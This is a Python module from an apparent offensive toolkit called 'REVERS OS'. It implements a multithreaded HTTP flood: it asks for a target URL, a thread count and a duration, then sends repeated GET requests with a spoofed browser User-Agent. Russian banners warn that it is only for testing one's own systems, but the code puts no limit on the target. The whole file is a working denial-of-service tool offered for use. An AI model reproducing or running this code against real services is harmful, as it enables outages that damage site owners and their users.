#!/usr/bin/env python3
"""
REVERS OS v3.0 — HTTP Flood
⚠️ Только для тестирования своих систем!
"""

import requests
import threading
import time
import sys
from core.utils import C_ERROR, C_WARNING, C_INFO, C_DIM, C_BRIGHT, C_RESET

running = False

def http_worker(url, duration):
    global running
    end_time = time.time() + duration
    sent = 0
    
    while running and time.time() < end_time:
        try:
            resp = requests.get(url, timeout=2, headers={"User-Agent": "Mozilla/5.0"})
            sent += 1
        except:
            pass
    
    return sent

def run_http_flood(args):
    global running
    
    print(f"\n{C_ERROR}╔══════════════════════════════════════════╗{C_RESET}")
    print(f"{C_ERROR}║  ⚠️  ВНИМАНИЕ! ТОЛЬКО ДЛЯ СВОИХ СИСТЕМ!  ║{C_RESET}")
    print(f"{C_ERROR}║  Незаконное использование запрещено!    ║{C_RESET}")
    print(f"{C_ERROR}╚══════════════════════════════════════════╝{C_RESET}\n")
    
    if not args:
        url = input(f"{C_INFO}URL цели: {C_RESET}").strip()
        if not url:
            print(f"{C_ERROR}[!] URL не указан.{C_RESET}")
            return
        try:
            threads = int(input(f"{C_INFO}Потоков (по умолч. 20): {C_RESET}").strip() or "20")
        except:
            threads = 20
        try:
            duration = int(input(f"{C_INFO}Длительность (сек, по умолч. 10): {C_RESET}").strip() or "10")
        except:
            duration = 10
    else:
        url = args[0]
        threads = int(args[1]) if len(args) > 1 else 20
        duration = int(args[2]) if len(args) > 2 else 10
    
    if not url.startswith("http"):
        url = "http://" + url
    
    print(f"\n{C_WARNING}  ══════════════════════════════════════════{C_RESET}")
    print(f"{C_WARNING}         ⚡ HTTP FLOOD{C_RESET}")
    print(f"{C_WARNING}         Цель: {url}{C_RESET}")
    print(f"{C_WARNING}         Потоков: {threads}{C_RESET}")
    print(f"{C_WARNING}         Длительность: {duration} сек{C_RESET}")
    print(f"{C_WARNING}  ══════════════════════════════════════════{C_RESET}\n")
    
    running = True
    workers = []
    
    print(f"{C_INFO}[*] Запуск...{C_RESET}")
    start_time = time.time()
    
    for _ in range(threads):
        t = threading.Thread(target=http_worker, args=(url, duration))
        t.daemon = True
        t.start()
        workers.append(t)
    
    try:
        while time.time() - start_time < duration and running:
            time.sleep(0.5)
            elapsed = int(time.time() - start_time)
            bar = "█" * (elapsed * 20 // duration) + "░" * (20 - elapsed * 20 // duration)
            sys.stdout.write(f"\r  [{bar}] {elapsed}s / {duration}s")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n{C_WARNING}[!] Прервано.{C_RESET}")
    
    running = False
    for t in workers:
        t.join(timeout=1)
    
    print(f"\n{C_INFO}[*] HTTP Flood завершён.{C_RESET}\n")
